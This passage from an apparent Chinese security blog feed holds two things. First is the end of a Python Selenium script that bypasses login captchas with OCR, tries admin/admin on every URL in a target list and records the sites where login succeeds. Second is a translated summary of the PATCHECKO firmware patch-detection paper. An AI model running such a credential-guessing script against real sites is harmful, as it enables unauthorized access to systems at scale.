查找验证码元素</span></span><br><span class="line">    png.screenshot(<span class="string">&#x27;capt.png&#x27;</span>)  <span class="comment"># 对验证码进行截图并保存</span></span><br><span class="line">    img = Image.<span class="built_in">open</span>(<span class="string">&#x27;capt.png&#x27;</span>)</span><br><span class="line">    img = img.convert(<span class="string">&#x27;L&#x27;</span>)  <span class="comment"># P模式转换为L模式(灰度模式默认阈值127)</span></span><br><span class="line">    count = <span class="number">190</span>  <span class="comment"># 设定阈值</span></span><br><span class="line">    table = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> i &lt; count:</span><br><span class="line">            table.append(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            table.append(<span class="number">1</span>)</span><br><span class="line">    img = img.point(table, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    img.save(<span class="string">&#x27;captcha1.png&#x27;</span>)  <span class="comment"># 保存处理后的验证码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def bd_discern():     #百度OCR，要钱</span></span><br><span class="line"><span class="comment">#     APP_ID = &#x27;&#x27;</span></span><br><span class="line"><span class="comment">#     API_KEY = &#x27;&#x27;</span></span><br><span class="line"><span class="comment">#     SECRET_KEY = &#x27;&#x27;</span></span><br><span class="line"><span class="comment">#     # 初始化对象</span></span><br><span class="line"><span class="comment">#     client = AipOcr(APP_ID, API_KEY, SECRET_KEY)</span></span><br><span class="line"><span class="comment">#     # 读取图片</span></span><br><span class="line"><span class="comment">#     def get_file_content(file_path):</span></span><br><span class="line"><span class="comment">#         with open(file_path, &#x27;rb&#x27;) as f:</span></span><br><span class="line"><span class="comment">#             return f.read()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     image = get_file_content(&#x27;captcha1.png&#x27;)</span></span><br><span class="line"><span class="comment">#     # 定义参数变量</span></span><br><span class="line"><span class="comment">#     options = &#123;&#x27;language_type&#x27;: &#x27;ENG&#x27;, &#125;  # 识别语言类型，默认为&#x27;CHN_ENG&#x27;中英文混合</span></span><br><span class="line"><span class="comment">#     #  调用通用文字识别</span></span><br><span class="line"><span class="comment">#     try:</span></span><br><span class="line"><span class="comment">#         result = client.basicGeneral(image, options)  # 高精度接口 basicAccurate  </span></span><br><span class="line"><span class="comment">#     except:</span></span><br><span class="line"><span class="comment">#         print(&quot;???&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     print (result)</span></span><br><span class="line"><span class="comment">#     for word in result[&#x27;words_result&#x27;]:</span></span><br><span class="line"><span class="comment">#         captcha = (word[&#x27;words&#x27;])</span></span><br><span class="line"><span class="comment">#         print(&#x27;识别结果：&#x27; + captcha)</span></span><br><span class="line"><span class="comment">#         return captcha</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dddd_ocr</span>():</span></span><br><span class="line">    ocr = ddddocr.DdddOcr()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./captcha1.png&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        img = f.read()</span><br><span class="line">    res = ocr.classification(img)</span><br><span class="line">    <span class="built_in">print</span> (res)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span>(<span class="params">cap</span>):</span></span><br><span class="line">    browser.find_element_by_id(<span class="string">&#x27;aa&#x27;</span>).send_keys(<span class="string">&#x27;admin&#x27;</span>)  </span><br><span class="line">    browser.find_element_by_id(<span class="string">&#x27;bb&#x27;</span>).send_keys(<span class="string">&#x27;admin&#x27;</span>)  </span><br><span class="line">    browser.find_element_by_id(<span class="string">&#x27;cc&#x27;</span>).send_keys(cap) </span><br><span class="line">    browser.find_element_by_id(<span class="string">&#x27;loginBtn&#x27;</span>).click()</span><br><span class="line">  </span><br><span class="line"><span class="comment"># def is_alter():</span></span><br><span class="line"><span class="comment">#     try:</span></span><br><span class="line"><span class="comment">#         alter = browser.switch_to.alert()</span></span><br><span class="line"><span class="comment">#         alter.text</span></span><br><span class="line"><span class="comment">#         if &#x27;密码错误&#x27; in dig_alert.text :</span></span><br><span class="line"><span class="comment">#             browser.quit()</span></span><br><span class="line"><span class="comment">#             return 1</span></span><br><span class="line"><span class="comment">#         elif &#x27;验证码错误&#x27; in dig_alert.text:</span></span><br><span class="line"><span class="comment">#             dig_alert.accept()</span></span><br><span class="line"><span class="comment">#             return 2</span></span><br><span class="line"><span class="comment">#     except:</span></span><br><span class="line"><span class="comment">#         return False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    outputH=<span class="built_in">open</span>(<span class="string">r&quot;C:\Users\Bruce\Desktop\实习\ip\脚本\outputH.txt&quot;</span>,<span class="string">&quot;w+&quot;</span>)</span><br><span class="line">    option = webdriver.ChromeOptions()</span><br><span class="line">    <span class="comment"># 防止打印一些无用的日志</span></span><br><span class="line">    option.add_experimental_option(<span class="string">&quot;excludeSwitches&quot;</span>, [<span class="string">&#x27;enable-automation&#x27;</span>, <span class="string">&#x27;enable-logging&#x27;</span>])</span><br><span class="line">    option.add_argument(<span class="string">&#x27;--ignore-certificate-errors&#x27;</span>)</span><br><span class="line">    <span class="comment"># 阻止弹出浏览器</span></span><br><span class="line">    option.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line">    option.add_argument(<span class="string">&#x27;--disable-gpu&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    web = <span class="built_in">open</span>(<span class="string">&quot;target.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">    lines = web.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lines:</span><br><span class="line">        browser = webdriver.Chrome(<span class="string">&quot;C:\Program Files\Google\Chrome\Application\chromedriver.exe&quot;</span>,chrome_options=option)</span><br><span class="line">        browser.set_page_load_timeout(<span class="number">10</span>)</span><br><span class="line">        max_time=<span class="number">4</span></span><br><span class="line">        <span class="keyword">while</span> max_time:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                get_pic(i)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                browser.quit()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment">#cap = bd_discern()</span></span><br><span class="line">            cap = dddd_ocr()</span><br><span class="line">            url1 = browser.current_url</span><br><span class="line">          </span><br><span class="line">            max_time=max_time-<span class="number">1</span></span><br><span class="line">            submit(cap)     <span class="comment">#尝试登录</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">          </span><br><span class="line">            <span class="keyword">try</span>:            <span class="comment">#如果浏览器弹出对话框</span></span><br><span class="line">                dig_alert = browser.switch_to_alert()</span><br><span class="line">                dig_alert.text</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;密码错误&#x27;</span> <span class="keyword">in</span> dig_alert.text :   <span class="comment">#停止尝试当前url</span></span><br><span class="line">                    browser.quit()</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> <span class="string">&#x27;验证码错误&#x27;</span> <span class="keyword">in</span> dig_alert.text:    <span class="comment">#再次登录</span></span><br><span class="line">                    dig_alert.accept()</span><br><span class="line">                    <span class="keyword">continue</span>              </span><br><span class="line">              </span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="comment">#判断进入了后台则记录到文本中</span></span><br><span class="line">                url2 = browser.current_url</span><br><span class="line">                <span class="built_in">print</span>(url1)</span><br><span class="line">                <span class="built_in">print</span>(url2)</span><br><span class="line"></span><br><span class="line">                outputH.write(i)</span><br><span class="line">                outputH.flush()</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>针对移动和物联网设备已知漏洞的混合固件分析</title>
    <url>/60805.html</url>
    <content><![CDATA[<blockquote>
<p>文章由本人首发于安全客：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjU5MjQ2">针对移动和物联网设备已知漏洞的混合固件分析 - 安全客，安全资讯平台 (anquanke.com)<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>一篇DSN2020 的论文：<span class="exturl" data-url="aHR0cHM6Ly9pZWVleHBsb3JlLmllZWUub3JnL2Fic3RyYWN0L2RvY3VtZW50LzkxNTMzOTk=">Hybrid Firmware Analysis for Known Mobile and IoT Security Vulnerabilities<i class="fa fa-external-link-alt"></i></span>，太长不看版会在不久后发出。</p>
<span id="more"></span>
<h1>0x0 摘要</h1>
<p>移动设备和物联网设备的操作系统以及它们随后的升级文件，通常是以二进制文件的形式发布。由于这些二进制文件通常是闭源的，用户或第三方企业若是想测试软件的安全性只能依靠逆向工程，此外，如何验证二进制文件中最近的补丁是否有效也是一个悬而未决的问题。常规的软件补丁修复是提升移动设备和物联网设备安全性的重要保障，这就需要开发人员、集成商和供应商的共同支持，及时把补丁分发到受影响的所有设备上。但实际上，供应商们对移动和物联网产品遵循着不同，甚至是错误的安全更新议程。其次，以往的研究反映出存在着“潜在的补丁缺口(a hidden patch gap)”：有些供应商错误的声称他们已经修复了漏洞。因此，在二进制文件中检测漏洞是否被修复对于软件安全至关重要。通过深度学习的方法来判断代码相似性和进行漏洞检测已经被证明在静态二进制代码分析中极具前景，然而，这种方法无法捕捉程序动态行为，导致了可能在挖掘在野漏洞时产生大量误报。此外还有一点十分关键，静态的方法无法捕捉到用于区分漏洞是否修复所需的细粒度特征。</p>
<p>在本文中，我们提出了PATCHECKO，一个针对可执行文件的漏洞和补丁存在性检测框架。PATCHECKO依赖于混合跨平台二进制代码相似性分析，一种结合了基于深度学习的静态代码分析和动态分析的方法。它不需要访问二进制文件的源代码。我们在最新的Google Pixel 2 和 Android Things IoT 固件映像上评估了PATCHECKO的性能，其中有25个CVE漏洞已经被报告和修复了。结果表明我们的深度学习模型在漏洞检测上达到了93%的准确率。 在动态分析过程中，我们删减了深度学习阶段得到的候选函数（包括误报）。结果表明，PATCHECKO总能在候选函数中将正确的结果输出在结果排名的前三名之中。此外，它的差分引擎也以96%的准确率区分了漏洞函数和已修复漏洞的函数。</p>
<h1>Ⅰ.引言</h1>
<p>软件漏洞披露的数量和发现漏洞的速度每年都在稳步上升。2010年提交给CVE数据库的漏洞报告数量大约为4600篇，2016年为6500篇，随后在2017年翻了一番，超过了14700篇。与此同时，移动和物联网设备的日益普及使他们成为了漏洞研究和利用的首选目标，根据Gartner预测，到2020年全球将会有204亿台物联网设备。此外，消费者和企业在其产品或者活动中也常常直接使用供应商提供的固件和补丁。这些外部设备通常需要进行一些检查步骤，包括对产品软件的安全断言等，例如进行黑盒渗透测试。如果这类测试没有做好，就可能会导致IoT设备的安全问题。好在对于渗透测试人员来说，移动和物联网供应商通常重复使用开源代码并将其应用到他们的产品。渗透测试人员通常关注于加密函数库、媒体函数库和解析器等在漏洞被发现后定期更新的二进制文件，但不幸的是，移动和物联网设备中这些库的源代码不易被获得，导致它们很难及时被更新到最新版本。</p>
<p>通常来说，移动和物联网设备的补丁管理对于这种异质的生态系统来说是一种挑战。2018年，美国联邦贸易委员会（FTC）的一份报告显示，一个生态系统的多样性一方面为消费者提供了大量的选择，另一方面却增加了安全更新的复杂性和不一致性。软件补丁必须经过许多中间商，从开发者到集成商再到供应商，最后才被推送到终端设备上。</p>
<p>这种较长的补丁链产生了两个问题。首先，这种冗长的中间人名单会使得补丁不能被及时到终端。在2016年， Duo Labs team 发现仅有25%的移动设备运行了最新的补丁。其次，供应商并不总能准确地报告他们是否修复了某个漏洞（潜在的补丁缺口），特别是对于移动设备和物联网设备。一个研究表明，由供应商发布的80.4%的固件都包含了多个已知漏洞，许多最近发布的固件升级包中里用使用的第三方库也存在许多漏洞，有些漏洞甚至在八年前就被发现了。另一个针对安卓手机的研究发现，一些供应商通常会<em>忘记</em>将漏洞修复，使得（物联网）生态系统的某一部分暴露在潜在的风险中。<br>
这种补丁缺口不仅会导致大量设备易受攻击，同时，随着代码重用的普遍性增加，开发人员可能直接使用存在已知漏洞的代码，导致漏洞迅速传播。</p>
<p>因此，识别存在漏洞的二进制代码和修复情况对终端用户来说是一个严峻的挑战。PATCHECKO通过一个混合两个步骤的方法解决了这个问题，该方法结合了一个轻量的固件静态分析和紧随其后的准确的动态分析，以完善静态分析的结果。</p>
<p><strong>依赖深度学习进行的已知漏洞挖掘。</strong> 对于如何在给定的二进制文件中得到漏洞的集合-或者至少是超集，是一个已经被探索过的问题，但并没有令人满意的答案。最近，研究人员正在尝试通过跨平台的二进制代码相似性检查来检测已知漏洞。这类方案尝试识别目标固件中是否存在某个漏洞，其与漏洞函数数据库中的函数相似。他们直接从控制流图里代表函数的每个结点的二进制代码中提取健壮（robust）的、独立于平台的特征。除此之外，还有的方法侧重于二进制代码的相似性检测，其中使用了图匹配算法来检查两个函数的控制流图表达是否相似。另外，这类方法中可以使用深度学习中的自然语言处理来代替人工选择特征。</p>
<p>以往的研究表明深度学习方法可以用于在二进制代码分析中检测漏洞。最新的算法训练表现的模型评估指标达到0.971、检测准确率超过80%。然而，即便有这种较好的表现，假设目标二进制代码有3000+个函数，我们仍旧会得到大量（600+个）候选函数需要我们在自动分析后人工进行确认。同时，已有研究证明，在能够访问符号表的情况下，候选函数是可以被精简的。但是，对于没有符号表的商用现成品（COTS）二进制文件，这种方法只能从它们那得到一个庞大的候选函数集，且大多是误报。因此，需要进一步对候选函数进行删减，以确保只识别和报告出真正含有漏洞的函数。PATCHECKO使用了目标二进制代码的静态分析结果（静态特征）来完成这一阶段。</p>
<p><strong>通过动态分析对候选函数进行删减。</strong> PATCHECK依据动态分析的结果（动态特征）对基于深度学习的方法得到的候选函数集进行删减，以避免误报。静态分析阶段已经移除了大多数极不可能含有漏洞的函数，只返回了一小部分函数，这使得PATCHECKO可以在这些函数上使用更耗费资源的动态分析技术。以往的工作出于对可扩展性的考虑，将执行速度放在首位，而牺牲了准确性，仅关注了基本块和函数的启发式特征或静态特征。相比之下，PATCHECKO的混合方法不仅加快了漏洞函数匹配的速度，而且在删减误报后也提升了准确率。</p>
<p>这个初始框架让我们能够开发一种新的训练模型生成方法，该方法使用默认策略预训练了一个与任务无关的图嵌入网络。接着，对从相同源代码编译而来但编译优化级别和目标平台不同的二进制函数集使用了这种方法，生成了一个大规模的数据集。随后，我们构建了一个漏洞数据库，其中包含了1382个移动/物联网设备固件的漏洞。</p>
<p>然而，我们最终的目标不仅仅是找到CVE编号对应的函数，而是分辨出目标固件中是否存在有漏洞，亦或是已经被修复了。</p>
<p><strong>修复状态检测。</strong> 过去的研究已经发展出了准确的补丁存在性检测，然而这个方案仅在能够访问到待检测函数和已修复漏洞函数的源代码时才适用。同时，因为这个方案依赖于基于二进制相似性检测的方法来定位目标函数，这也可能导致之前提到过的对候选函数的大量误报。我们的方案直接操作于剥离符号表的商用二进制文件，且在不需要访问源代码的同时还能明显地减少误报。</p>
<p>最后，本文提出了PATCHECKO，一个结合了基于深度学习的二进制代码相似性检查和动态分析的框架，适用于挖掘已知漏洞和补丁存在性检测。根据我们的评估结果，PATCHECKO在准确性和效率方面都明显优于目前最先进的算法。</p>
<p><strong>贡献。</strong> 我们总结了我们做出的贡献如下：</p>
<ul>
<li>提出了一个高效的固件漏洞和补丁存在性检测框架。该框架利用了深度学习和动态二进制分析技术，在无需访问源代码的情况下，实现了对受限二进制固件的高准确率和高性能的已知漏洞挖掘。</li>
<li>提出了一个细粒度的二进制比较算法，能够准确的区分出同一函数的二进制代码的修复和未修复版本。我们的方案目前支持跨平台的ARM和X86架构。针对比较而选用的相关特征使得此方案能够以非常低的误报率，准确的定位未打补丁的函数。</li>
<li>我们用4种架构、100个安卓固件库、25个CVE漏洞来评估PATCHECKO的性能，结果表明它非常有希望在实际环境中进行得到应用。PATCHECKO的大部分原型都是完全自动化的，同时，它的动态分析模块可以准确的识别和删除深度学习阶段的误报。动态分析后，由另一个模块再对结果进行处理，将未打补丁的函数和已修复的函数区分开。</li>
</ul>
<h1>Ⅱ.概述</h1>
<p>我们在Ⅱ-A里介绍了函数相似性的问题和面临的挑战，在Ⅱ-B里展示了我们的解决方案。</p>
<h2 id="A-威胁模型和挑战">A.威胁模型和挑战</h2>
<p>在本文中，我们主要考虑在没有源代码的情况下寻找商用移动/物联网设备二进制文件中的已知漏洞。我们还假设二进制文件没有经过压缩或者混淆，且是由高级语言，即具有函数概念的语言编译而成的，因为在分析混淆过的代码时，有一个很重要的问题是如何对代码进行处理，而这超出了本文讨论的范围。基于以上这些假设，我们列出了在移动/物联网平台下面临的以下几个挑战。</p>
<p><strong>针对不同平台架构的大量二进制文件。</strong> 移动/物联网平台通常由各种不同架构的硬件组成，但它们可能拥有相同的软件漏洞。因此，我们特别考虑了，不同目标平台和优化级别对相同源代码产生的二进制程序这一情况。通过这种方式，我们可以生成不同硬件架构（例如x86和ARM）和软件平台（例如Windows、Linux和MacOS）下具有相同漏洞的二进制函数。<br>
<strong>大量的候选漏洞函数。</strong> 为了体现候选漏洞函数的数量级，我们分析了 Android Things 1.0 和 IOS 12.0.1 的固件。对于 Android Things 1.0 ，我们找到了379个不同的库，其中包含440532个函数；对于 IOS 12.0.1 ，我们找到了198个库，包含93714个函数。虽然过往的研究表明基于深度学习的方法可以用于高精度识别候选漏洞函数集，但这类技术并没有自动化的解决方案来对误报结果进行进一步删减。此外，“Precise and accurate patch presence test for binaries”研究中提出的方案依赖于符号表，但受限制的商用软件中并没有符号表可以使用，这就提出了另一个问题，即如何对没有符号表的二进制文件进行候选漏洞函数的删减。<br>
<strong>区分已修复代码和漏洞代码。</strong> 未修复函数和已修复函数可能并不容易区分，它们之间的差别可能小到只改变了一行代码。以往的研究表明，在能够访问含有漏洞的函数源码和修复过漏洞的函数源码的情况下，我们可以检测漏洞是否被修复，但大部分时候我们无法获得二进制函数的源码。</p>
<p>针对这些有趣的挑战，我们现在介绍一下PATCHECKO框架。</p>
<h2 id="B-方案">B.方案</h2>
<p>PATCHECKO框架的执行流程在图1进行了展示。我们的方案分为三个步骤进行：（1）用深度学习训练漏洞检测器，（2）用训练的漏洞检测器对目标移动/物联网固件进行静态分析，（3）对静态分析出可能含有漏洞的函数进行进一步的动态分析，验证漏洞是否存在，随后使用从漏洞函数和已修复漏洞函数中提取的静态和动态特征，识别候选漏洞函数是否已经被修复。<br>
PATCHECKO的目标是将二进制固件中的函数与CVE漏洞库以及相关的补丁进行对比，输出目标固件镜像中的漏洞函数以及对应的CVE编号。为了比较两个二进制函数运行时的特征，PATCHECKO结合了静态和动态分析技术以及人工智能和机器学习的深度学习方法。PATCHECKO先使用轻量级的静态分析模块将每个固件中的函数转换为用于机器学习的特征向量，接着调事先训练过的深度神经网络模型来判断两个（源代码相同但编译选项可能不同的）函数（一个来自固件，另一个来自CVE数据库）是否相似。如果两个函数检测结果表明可能相似，PATCHECKO就会进行更深入的动态分析，来确保静态分析的结果并不是误报。<br>
为了进行动态分析，PATCHECKO在对应的移动/物联网嵌入式系统平台内运行CVE漏洞函数和目标固件函数时，使用了DLL注入以及远程调试并给函数参数和全局变量赋了相同的值。它捕捉了两个函数的每个运行轨迹并提取动态特征，例如指令的数量和类型、系统调用的次数和类型，以及库函数调用和堆栈数据读写量等。<br>
基于提取出的这些特征，PATCHECKO算出两个函数的相似度并判断静态分析的结果是否是正确的。如果正确，PATCHECKO就认为这个该固件里的这个函数存在对应CVE编号，并在结果中报告该固件和对应的CVE编号。值得一提的是，PATCHECKO的分析过程不需要访问源代码，因此完全不需要固件供应商的支持。<br>
因为我们并不知道前一步输出的函数是否被修复过，PATCHECKO会先基于两个函数的静态特征对它们进行比较，然后再用已修复函数与目标函数进行比较，随后使用差分引擎对静态/动态特征和相似度进行分析，来判断函数中的漏洞是否被修复了。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210903221707.png" alt="图1"></p>
<h1>Ⅲ. 设计</h1>
<p>在这一节中，我们将展示PATCHECKO框架的设计方案，包括它是如何处理移动/物联网二进制可执行文件、如何在无源代码的条件下发现并报告固件里代码段或数据段中的漏洞。在基于相似性检测的漏洞挖掘之外，PATCHECKO还能够准确识别目标固件是否打上了安全补丁。</p>
<h2 id="A-基于深度学习的固件漏洞评估">A.基于深度学习的固件漏洞评估</h2>
<p>对于已知漏洞挖掘，深度学习方法的准确性和效率都明显优于过去的二分图匹配和动态相似性测试。这是由于深度学习方法可以从整体上评估二进制文件的图像表示，而且可以在没有人为定义规则的情况下自主学习关系。PATCHECKO的第一步使用了一个深度学习框架，在短时间内生成了一个候选漏洞函数列表。为了符合之前的假设，我们首先需要提取静态静态函数特征，构建一个训练数据集，然后对深度学习模型进行训练。<br>
<strong>特征提取。</strong> 为了提取函数的静态特征，PATCHECKO首先分析了函数的汇编格式，标记了每个每个汇编例程正确的边界、范围。PATCHECKO的神经网络模型输入的数据是从目标函数的反编译代码中提取的函数特征向量。为了获得特征向量，我们先识别了函数的边界。在尽量不依赖指令集语义的情况下识别函数边界是一个有趣的问题，以往这个任务都由传统的机器学习或神经网络或函数接口验证来进行，在我们的设计中，这些方法都由反汇编器通过某种具有鲁棒性的启发式技术完成。反汇编器可以提供一个二进制文件的控制流图（CFG），一个在漏洞检测中常常使用的特征。<br>
图2表示了PATCHECKO的函数特征提取过程。PATCHECKO利用了具有不同基本块级属性的CFG作为特征来进行模拟。对于每个函数，PATCHECKO可以提取函数级、基本块级、块间级信息。表Ⅰ展示了生成一个特征向量用到的提取出的48个有趣的特征。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210908215509.png" alt="图2"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210908213440.png" alt="表Ⅰ"><br>
PATCHECKO保证了提取特征的丰富（48个特征）、高效（自动提取）和可扩展性（支持多架构）<br>
<strong>训练深度学习模型。</strong> 对于PATCHECKO的深度学习，我们采用了一个由线性层堆叠的序贯模型，所有超参数都是凭经验确定的。图3展示了一个用于深度学习模型的样本向量。样本向量由函数向量对和一个表示两个函数是否相似的比特组成，其中两个相似的特征向量对应着相同源代码的两个二进制函数。图4描述了一个用6层网络模型训练的实际过程。我们首先为每一层指定了输入。顺序模型中的第一层需要接收输入张量的形状（input shape）的信息。这个模型使用了从我们数据集中提取的函数特征进行训练，该数据集包含了2108个具有不同架构的二进制文件。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210918220859.png" alt="20210918220859"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210917223725.png" alt="20210917223725"></p>
<h2 id="B-通过深入的动态分析删去候选函数中的误报">B.通过深入的动态分析删去候选函数中的误报</h2>
<p>我们使用动态分析来进一步删减深度学习阶段返回的候选函数。本阶段判断了先前报告的函数对是否确实是相似的（例如，均为修复过或含有漏洞的函数）。在动态分析步骤进行时，程序用相同的输入值执行了两个候选函数，并比较了观察到的行为和其他几个特征的相似性。<br>
由于生成两个函数的编译选项可能不同，在这种情况下，对于相同的输入，两个函数的执行轨迹可能差别很大。因此，我们的分析将考虑执行轨迹的语义相似性，即两个函数输入相同数值后执行完毕对内存的影响。<br>
为了实现这个功能，我们从执行轨迹中提取了特征（动态特征）。我们的方法比较了两个具有相同输入值的函数所产生的两条执行轨迹的特征向量。如果对于不同的输入值，均观察到具有相似的特征，那么我们就猜测它们在语义上是相似的。<br>
图5展示了PATCHECKO动态分析的工作流程。真正要进行动态分析还有如下几个困难：首先，如何准备执行的环境；其次，如何同时监控多个候选函数的执行情况；另外，由于我们研究的是异构的移动/物联网生态系统，因此要运行所有的二进制代码来获得执行轨迹并不容易，特别是一些函数的执行需要“有效”的输入。我们先讨论输入动态分析引擎的准备工作。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210918220751.png" alt="20210918220751"><br>
<strong>输入动态分析引擎的数据。</strong> 实现PATCHECKO动态分析引擎的一个关键问题是如何准备相关的输入。动态分析引擎需要两个输入内容：程序的二进制代码，我们称为** F** ，以及** F** 的运行环境。其中程序的二进制代码包括了目标函数** f** 。有一个难点是，如何将目标函数和整个二进制函数的执行区别开。一个方案是在执行时提供具体而有效的输入值，但因为无法引导操作系统在特定的地址开始执行程序，所以这个方案通常需要装载并运行整个程序。PATCHECKO提供一个包含了所需执行状态的执行环境，从而解决了这个问题。<br>
PATCHECKO使用模糊测试为不同目标函数生成不同的输入，来加快控制流图（CFG）的覆盖率。对于每次目标函数的执行，PATCHECKO都会导出一个压缩的函数级可执行文件，即一个压缩的、可通过运行时DLL注入执行的二进制文件和使其能够运行的相关输入。这使得动态分析执行引擎能够高效地执行目标函数，同时也意味着PATCHECKO可以针对不同目标函数使用特定执行环境和不同输入。<br>
<strong>验证候选函数的执行。</strong> 在PATCHECKO开始插桩检测目标函数前，它对众多的候选函数使用了多种的执行环境。在我们开始运行目标函数f后会有几个可能的结果，例如，函数f可能正常运行，可能产生了系统异常，或者进入死循环。如果候选函数f触发了一个系统异常，我们将从候选集里移除该函数。在使用多种执行环境验证各个函数执行后，将会对候选函数进行插桩。<br>
<strong>目标函数插桩检测。</strong> 在特定执行环境下，动态分析引擎对函数f的分析结果输出了一个长度为N的特征向量<em>v(f，env)</em>。为了生成该特征向量，PATCHECKO追踪了函数的执行。在动态分析时，通常有大量的工具可以使用，例如调试器、模拟器和虚拟机，但由于移动/物联网固件架构和平台的异构性，PATCHECKO因此选用了一个支持多种架构和平台的插桩工具。<br>
PATCHECKO提取了各种指令的指定特征，包括指令信息（例如指令数量）、系统级信息（例如内存访问）以及例如函数和系统调用的高级别特征。表Ⅱ展示了我们最初考虑并最终证明对建立函数二元相似性有用的初始特征集。当然这些特征并不并不全面，也很容易进一步扩展。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210919143257.png" alt="20210919143257"><br>
对于每次执行，动态分析引擎会对每个特征会生成一组观察结果，例如，在上面的例子里会生成21组观察结果。当f里的所有指令都被覆盖到后，PATCHECKO把所有结果合并成一个单独的向量，例如f<sub>input_1</sub>。同样的过程会在每次对函数进行不同输入时重复，产生f<sub>input_2</sub>、f<sub>input_3</sub>、…、f<sub>input_N</sub>。<br>
现在我们能够提取目标函数的动态特征了，接下来介绍计算一对函数以及特征集之间相似性的算法。</p>
<h2 id="C-计算函数语义相似度">C.计算函数语义相似度</h2>
<p>对于每个函数对(f,g)，PATCHECKO基于它们的动态特征向量距离计算出语义相似度。距离通常被用于代表在数据挖掘时对象特征的维度。值得一提的是，对于每个函数的特征向量，PATCHECKO使用了闵氏距离(Minkowski Distance)作为测量相似度的方法。不同的参数会导致特征向量中相应的坐标值有轻微差异，我们现在详细讨论一下距离的测量。<br>
闵氏距离是欧氏距离(Euclidean Distance)和曼哈顿距离(Manhattan distance)的一般化形式（闵氏距离中的p=2时即为欧氏距离，p=1时即为曼哈顿距离）。在我们的项目中，将闵氏距离的p设为3。闵氏距离公式的一般式如下：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210919171915.png" alt="20210919171915"><br>
在这个闵氏距离公式中，f代表了CVE函数，g代表目标固件中的候选函数，k指的是用到了第k个执行环境，x和y分别代表f和g的动态特征向量，此时P设为3。<br>
我们计算了每一对(f,g)在多种执行环境下的相似度，然后算出所有执行环境中的平均值得到最终结果。设k为执行环境的编号，我们定义：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210919180346.png" alt="20210919180346"><br>
最后，我们将每个候选函数的动态特征向量送入相似度计算的方程中，得到一系列（函数和相似性距离）的排名对（见图5）。这是检测已知漏洞的最后一步，现在我们开始设计检测补丁是否存在的最后一个步骤。</p>
<h2 id="D-补丁检测">D.补丁检测</h2>
<p>我们注意到一个补丁通常只对漏洞函数引入了一点点改变，然而这些细微的改变仍然可以对修复前和修复后的函数造成明显影响，使它们存在一定差异-这一观点会在第Ⅴ节得到证实。基于这个概念，PATCHECKO使用了一个差分引擎来收集静态和动态相似性检测结果，来判断一个漏洞函数是否被修复了。<br>
对于给定的漏洞函数f<sub>v</sub>、已修复函数f<sub>p</sub>和目标函数f<sub>t</sub>，差分引擎会首先生成三个值：f<sub>v</sub>、f<sub>p</sub>和f<sub>t</sub>的静态特征、sim<sub>v</sub>与sim<sub>t</sub>、sim<sub>p</sub>与sim<sub>t</sub>的动态语义相似性得分以及S<sub>v</sub>和S<sub>p</sub>之间的差分特征（differential signatures）。静态特征即上述的48个不同的量化特征，动态语义相似度得分与上述的函数相似度指标。差分特征（differential signatures）是一个用于比较CFG结构的附加指标，即两个函数的CFG拓扑以及语义信息，例如函数参数、局部变量和库函数调用。</p>
<h1>Ⅳ.实现及案例研究</h1>
<p>我们将PATCHECKO框架部署在了Ubuntu18.04-amd64上，实验过程在一个配有 Intel Xeon E5-1650v4 、 128GB 内存、 2TB SSD 和 4块 NVIDIA 1080Ti GPU 的服务器上进行，在训练和评估过程中，4块GPU均被使用到了。在设计中，PATCHECKO由四个主要部分组成：特征提取器、深度学习模型、动态分析引擎和用于补丁检测的差异分析引擎。</p>
<h2 id="A-特征提取和深度学习">A.特征提取和深度学习</h2>
